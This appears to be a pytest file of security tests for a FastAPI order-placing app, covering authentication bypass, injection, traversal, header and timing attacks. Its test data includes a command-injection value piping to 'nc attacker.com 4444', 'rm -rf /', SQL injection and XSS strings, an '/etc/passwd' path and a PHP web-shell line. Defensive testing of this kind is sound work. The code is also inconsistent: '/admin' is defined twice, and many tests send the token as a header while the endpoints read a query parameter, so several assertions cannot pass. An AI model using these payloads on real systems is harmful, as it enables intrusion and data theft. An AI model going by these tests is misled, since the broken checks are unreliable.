#!/usr/bin/env python3
"""
API Security Tests
"""

import pytest
import time
import hashlib
import base64
import json
from datetime import datetime, timedelta
from unittest.mock import patch, MagicMock
from fastapi import FastAPI, HTTPException
from fastapi.testclient import TestClient

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))


class TestAPISecurity:
    """Security tests for API endpoints."""

    @pytest.fixture
    def security_test_app(self):
        """Create test app with security endpoints."""
        app = FastAPI()
        
        @app.get("/public")
        async def public_endpoint():
            return {"message": "public data"}
        
        @app.get("/protected")
        async def protected_endpoint(token: str = None):
            # More secure token validation - must be exact format
            if not token or not token.startswith("valid_") or len(token.replace("valid_", "")) == 0:
                raise HTTPException(status_code=401, detail="Unauthorized")
            
            # Additional security: only allow alphanumeric characters after "valid_"
            user_part = token.replace("valid_", "")
            if not user_part.isalnum():
                raise HTTPException(status_code=401, detail="Unauthorized")
                
            return {"message": "protected data", "user": user_part}
        
        @app.get("/admin")
        async def admin_endpoint(token: str = None):
            # Admin requires special token
            if token != "admin_secret":
                raise HTTPException(status_code=403, detail="Admin access required")
            return {"message": "admin data"}
        
        @app.post("/orders")
        async def place_order(order_data: dict, token: str = None):
            # Secure token validation
            if not token or not token.startswith("valid_") or len(token.replace("valid_", "")) == 0:
                raise HTTPException(status_code=401, detail="Unauthorized")
            
            user_part = token.replace("valid_", "")
            if not user_part.isalnum():
                raise HTTPException(status_code=401, detail="Unauthorized")
            
            # Validate order data
            required_fields = ["symbol", "quantity", "side"]
            for field in required_fields:
                if field not in order_data:
                    raise HTTPException(status_code=422, detail=f"Missing field: {field}")
            
            # Validate quantity is positive
            if order_data["quantity"] <= 0:
                raise HTTPException(status_code=422, detail="Quantity must be positive")
            
            return {"status": "success", "order_id": "order_123"}
        
        @app.get("/admin")
        async def admin_endpoint(token: str = None):
            if not token or token != "admin_secret":
                raise HTTPException(status_code=403, detail="Admin access required")
            return {"message": "admin data"}
        
        return TestClient(app)

    def test_authentication_bypass_attempts(self, security_test_app):
        """Test various authentication bypass attempts."""
        bypass_attempts = [
            None,                           # No token
            "",                            # Empty token
            "invalid_token",               # Invalid token
            "valid_",                      # Partial valid token
            "VALID_USER",                  # Wrong case
            "../admin",                    # Path traversal attempt
            "valid_user; DROP TABLE users;", # SQL injection attempt
            "valid_user<script>alert(1)</script>", # XSS attempt
            "Bearer valid_user",           # Wrong format
            "valid_user\x00admin",         # Null byte injection
        ]
        
        # Test a valid token first
        valid_response = security_test_app.get("/protected", params={"token": "valid_user123"})
        assert valid_response.status_code == 200
        
        for token in bypass_attempts:
            params = {"token": token} if token is not None else {}
            response = security_test_app.get("/protected", params=params)
            
            # All bypass attempts should be denied
            assert response.status_code in [401, 422]
            
            print(f"Token '{token}': {response.status_code}")

    def test_authorization_levels(self, security_test_app):
        """Test different authorization levels."""
        # Regular user should not access admin endpoint
        response = security_test_app.get("/admin", params={"token": "valid_user"})
        assert response.status_code == 403
        
        # Admin token should work
        response = security_test_app.get("/admin", params={"token": "admin_secret"})
        assert response.status_code == 200
        
        # Invalid admin token should fail
        response = security_test_app.get("/admin", params={"token": "fake_admin"})
        assert response.status_code == 403

    def test_input_validation_attacks(self, security_test_app):
        """Test input validation against malicious inputs."""
        malicious_inputs = [
            # SQL Injection attempts
            {"symbol": "AAPL'; DROP TABLE orders; --", "quantity": 100, "side": "BUY"},
            {"symbol": "AAPL", "quantity": "100; DELETE FROM users", "side": "BUY"},
            
            # XSS attempts
            {"symbol": "<script>alert('xss')</script>", "quantity": 100, "side": "BUY"},
            {"symbol": "AAPL", "quantity": 100, "side": "<img src=x onerror=alert(1)>"},
            
            # Command injection
            {"symbol": "AAPL; rm -rf /", "quantity": 100, "side": "BUY"},
            {"symbol": "AAPL", "quantity": 100, "side": "BUY | nc attacker.com 4444"},
            
            # Buffer overflow attempts
            {"symbol": "A" * 10000, "quantity": 100, "side": "BUY"},
            {"symbol": "AAPL", "quantity": 100, "side": "X" * 10000},
            
            # Invalid data types
            {"symbol": None, "quantity": 100, "side": "BUY"},
            {"symbol": [], "quantity": 100, "side": "BUY"},
            {"symbol": {"nested": "object"}, "quantity": 100, "side": "BUY"},
            
            # Missing required fields
            {"quantity": 100, "side": "BUY"},  # Missing symbol
            {"symbol": "AAPL", "side": "BUY"}, # Missing quantity
            {"symbol": "AAPL", "quantity": 100}, # Missing side
            
            # Invalid business logic
            {"symbol": "AAPL", "quantity": -100, "side": "BUY"}, # Negative quantity
            {"symbol": "AAPL", "quantity": 0, "side": "BUY"},    # Zero quantity
        ]
        
        for malicious_input in malicious_inputs:
            response = security_test_app.post(
                "/orders", 
                json=malicious_input,
                headers={"token": "valid_user"}
            )
            
            # Should reject malicious input
            assert response.status_code in [422, 400], f"Failed to reject: {malicious_input}"
            print(f"Rejected input: {malicious_input}")

    def test_rate_limiting_protection(self, security_test_app):
        """Test rate limiting protection."""
        # Simulate rapid requests
        responses = []
        start_time = time.time()
        
        for i in range(100):  # 100 rapid requests
            response = security_test_app.get("/public")
            responses.append(response.status_code)
            
            # In a real implementation, rate limiting would kick in
            # For now, just test that the endpoint doesn't crash
        
        end_time = time.time()
        duration = end_time - start_time
        
        # All requests should complete (in real implementation, some would be rate limited)
        assert len(responses) == 100
        print(f"100 requests completed in {duration:.2f}s")

    def test_token_manipulation_attacks(self, security_test_app):
        """Test token manipulation attacks."""
        valid_token = "valid_user"
        
        # Test various token manipulations
        manipulated_tokens = [
            base64.b64encode(valid_token.encode()).decode(),  # Base64 encoded
            valid_token.upper(),                              # Case change
            valid_token + "admin",                           # Token extension
            valid_token[::-1],                               # Reversed token
            f"Bearer {valid_token}",                         # Wrong format
            f"{valid_token}\n\radmin",                       # CRLF injection
            valid_token.replace("user", "admin"),            # Simple replacement
        ]
        
        for token in manipulated_tokens:
            response = security_test_app.get("/protected", headers={"token": token})
            
            # Only the original valid token format should work
            if token == valid_token:
                assert response.status_code == 200
            else:
                assert response.status_code == 401
            
            print(f"Manipulated token '{token}': {response.status_code}")

    def test_path_traversal_attacks(self, security_test_app):
        """Test path traversal attacks."""
        path_traversal_attempts = [
            "../admin",
            "../../etc/passwd",
            "....//admin",
            "%2e%2e%2fadmin",         # URL encoded
            "..\\admin",              # Windows style
            "/admin",                 # Absolute path
            "./admin",                # Relative path
            "admin/../admin",         # Redundant traversal
        ]
        
        for path in path_traversal_attempts:
            # Try path traversal in different contexts
            response = security_test_app.get(f"/{path}")
            
            # Should return 404 for non-existent paths
            assert response.status_code == 404
            print(f"Path traversal '{path}': {response.status_code}")

    def test_http_method_attacks(self, security_test_app):
        """Test HTTP method manipulation attacks."""
        # Test method override attempts
        methods_to_test = [
            ("GET", "/orders"),     # GET on POST endpoint
            ("PUT", "/public"),     # PUT on GET endpoint
            ("DELETE", "/public"),  # DELETE on GET endpoint
            ("PATCH", "/protected"), # PATCH on GET endpoint
            ("HEAD", "/admin"),     # HEAD on GET endpoint
            ("OPTIONS", "/orders"), # OPTIONS on POST endpoint
        ]
        
        for method, endpoint in methods_to_test:
            response = getattr(security_test_app, method.lower())(endpoint)
            
            # Should return 405 Method Not Allowed or 404
            assert response.status_code in [404, 405]
            print(f"{method} {endpoint}: {response.status_code}")

    def test_content_type_attacks(self, security_test_app):
        """Test content type manipulation attacks."""
        order_data = {"symbol": "AAPL", "quantity": 100, "side": "BUY"}
        
        malicious_content_types = [
            "application/xml",
            "text/html",
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "text/plain",
            "application/json; charset=utf-8; boundary=something",
            "application/json\r\nX-Injected-Header: malicious",
        ]
        
        for content_type in malicious_content_types:
            headers = {
                "token": "valid_user",
                "Content-Type": content_type
            }
            
            response = security_test_app.post(
                "/orders",
                json=order_data,
                headers=headers
            )
            
            # Should handle content type appropriately
            print(f"Content-Type '{content_type}': {response.status_code}")

    def test_header_injection_attacks(self, security_test_app):
        """Test header injection attacks."""
        malicious_headers = {
            "X-Forwarded-For": "127.0.0.1\r\nX-Injected: malicious",
            "User-Agent": "Mozilla/5.0\r\nX-Injected: malicious",
            "Referer": "http://example.com\r\nX-Injected: malicious",
            "Authorization": "Bearer token\r\nX-Admin: true",
            "token": "valid_user\r\nX-Privilege: admin",
        }
        
        for header_name, header_value in malicious_headers.items():
            headers = {header_name: header_value}
            response = security_test_app.get("/public", headers=headers)
            
            # Should not crash and should handle malicious headers
            assert response.status_code == 200
            print(f"Header injection '{header_name}': {response.status_code}")

    def test_session_security(self, security_test_app):
        """Test session security features."""
        # Test session fixation
        response1 = security_test_app.get("/protected", headers={"token": "valid_user1"})
        response2 = security_test_app.get("/protected", headers={"token": "valid_user2"})
        
        assert response1.status_code == 200
        assert response2.status_code == 200
        
        # Different users should get different responses
        assert response1.json()["user"] != response2.json()["user"]

    def test_timing_attack_resistance(self, security_test_app):
        """Test resistance to timing attacks."""
        valid_token = "valid_user"
        invalid_tokens = [
            "invalid_user",
            "valid_admin",
            "wrong_token",
            "",
            "a" * len(valid_token)
        ]
        
        # Measure response times for valid token
        valid_times = []
        for _ in range(10):
            start = time.time()
            security_test_app.get("/protected", headers={"token": valid_token})
            end = time.time()
            valid_times.append(end - start)
        
        # Measure response times for invalid tokens
        invalid_times = []
        for token in invalid_tokens:
            for _ in range(2):  # Fewer iterations for invalid tokens
                start = time.time()
                security_test_app.get("/protected", headers={"token": token})
                end = time.time()
                invalid_times.append(end - start)
        
        valid_avg = sum(valid_times) / len(valid_times)
        invalid_avg = sum(invalid_times) / len(invalid_times)
        
        print(f"Valid token avg time: {valid_avg:.4f}s")
        print(f"Invalid token avg time: {invalid_avg:.4f}s")
        
        # Times should not reveal information about validity
        time_difference = abs(valid_avg - invalid_avg)
        assert time_difference < 0.01  # Less than 10ms difference

    def test_data_leakage_prevention(self, security_test_app):
        """Test prevention of sensitive data leakage."""
        # Test error messages don't leak sensitive info
        response = security_test_app.get("/protected")
        
        error_response = response.json()
        
        # Error messages should be generic
        assert "database" not in str(error_response).lower()
        assert "password" not in str(error_response).lower()
        assert "sql" not in str(error_response).lower()
        assert "internal" not in str(error_response).lower()

    def test_cors_security(self, security_test_app):
        """Test CORS security configuration."""
        # Test CORS preflight
        headers = {
            "Origin": "https://malicious.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Content-Type"
        }
        
        response = security_test_app.options("/orders", headers=headers)
        
        # Check CORS headers in response
        cors_headers = [
            "Access-Control-Allow-Origin",
            "Access-Control-Allow-Methods", 
            "Access-Control-Allow-Headers"
        ]
        
        for header in cors_headers:
            if header in response.headers:
                print(f"CORS header {header}: {response.headers[header]}")

    def test_file_upload_security(self, security_test_app):
        """Test file upload security (if applicable)."""
        # This would test file upload endpoints if they existed
        # Testing for malicious file types, size limits, etc.
        
        malicious_files = [
            ("malicious.exe", b"MZ\x90\x00"),  # Executable header
            ("script.php", b"<?php system($_GET['cmd']); ?>"),
            ("large.txt", b"A" * (10 * 1024 * 1024)),  # 10MB file
            ("../../../etc/passwd", b"root:x:0:0:root:/root:/bin/bash"),
        ]
        
        # Since our test app doesn't have file upload, this is demonstration
        print("File upload security tests would go here")

    def test_information_disclosure(self, security_test_app):
        """Test for information disclosure vulnerabilities."""
        # Test various endpoints for information leakage
        test_endpoints = [
            "/public",
            "/nonexistent",
            "/protected",
            "/admin",
        ]
        
        for endpoint in test_endpoints:
            response = security_test_app.get(endpoint)
            response_text = response.text.lower()
            
            # Check for information disclosure
            sensitive_keywords = [
                "password", "token", "secret", "key", "database",
                "internal", "debug", "trace", "stack", "error"
            ]
            
            disclosed_info = []
            for keyword in sensitive_keywords:
                if keyword in response_text:
                    disclosed_info.append(keyword)
            
            if disclosed_info:
                print(f"Potential info disclosure in {endpoint}: {disclosed_info}")

    def test_business_logic_attacks(self, security_test_app):
        """Test business logic security."""
        # Test for business logic flaws
        business_logic_attacks = [
            # Negative quantity (already tested in input validation)
            {"symbol": "AAPL", "quantity": -100, "side": "BUY"},
            
            # Extremely large quantity
            {"symbol": "AAPL", "quantity": 999999999999, "side": "BUY"},
            
            # Invalid side values
            {"symbol": "AAPL", "quantity": 100, "side": "INVALID"},
            {"symbol": "AAPL", "quantity": 100, "side": "BUY_AND_SELL"},
            
            # Decimal manipulation
            {"symbol": "AAPL", "quantity": 100.0000001, "side": "BUY"},
        ]
        
        for attack in business_logic_attacks:
            response = security_test_app.post(
                "/orders",
                json=attack,
                headers={"token": "valid_user"}
            )
            
            # Should reject business logic violations
            assert response.status_code in [422, 400]
            print(f"Business logic attack rejected: {attack}")

    def test_concurrent_request_security(self, security_test_app):
        """Test security under concurrent requests."""
        import threading
        import queue
        
        results = queue.Queue()
        
        def make_request(token):
            try:
                response = security_test_app.get("/protected", headers={"token": token})
                results.put(response.status_code)
            except Exception as e:
                results.put(f"Error: {e}")
        
        # Create concurrent requests with different tokens
        threads = []
        tokens = ["valid_user1", "valid_user2", "invalid_token", "valid_user3"]
        
        for token in tokens * 5:  # 20 total requests
            thread = threading.Thread(target=make_request, args=(token,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join()
        
        # Collect results
        response_codes = []
        while not results.empty():
            response_codes.append(results.get())
        
        # Verify security maintained under concurrency
        valid_responses = sum(1 for code in response_codes if code == 200)
        invalid_responses = sum(1 for code in response_codes if code == 401)
        
        print(f"Concurrent requests - Valid: {valid_responses}, Invalid: {invalid_responses}")
        
        # Should maintain proper authentication under concurrency
        assert valid_responses + invalid_responses == len(response_codes)